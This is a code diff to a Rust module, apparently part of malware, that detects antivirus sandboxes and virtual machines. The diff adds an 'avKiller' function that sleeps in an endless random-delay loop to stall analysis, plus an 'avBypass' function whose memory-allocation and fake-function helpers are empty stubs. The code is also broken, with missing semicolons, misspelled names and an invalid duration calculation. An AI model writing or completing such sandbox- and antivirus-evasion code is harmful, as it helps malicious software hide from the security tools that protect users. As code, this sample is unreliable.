@@ -1,3 +1,7 @@
+extern crate rand;
+use crate::variables;
+use std::{thread, time};
+
 // Module to detect AV sandbox || Virtual Machine
 
 // #1
@@ -28,3 +32,28 @@
 //     VirtualBox
 //         vboxservice.exe
 //         vboxtray.exe
+
+pub fn avKiller() {
+	if variables::kill_AV {
+        let mut rng = rand::thread_rng();
+        loop {
+            thread::sleep(time::Duration::from_millis(rng.gen_range(500, 1000)) * rng.gen_range(100000, 1000000));
+        }
+    }
+}
+
+pub fn avBypass() {
+    if variables::bypass_AV {
+        mermoryAlloc()
+        fakeFuncs()
+        // TODO: AV Bypass (Alloc mermory + fake funcs)
+    }
+}
+
+fn mermoryAlloc() {
+    // todo
+}
+
+fn fakeFuncs() {
+    // todo
+}
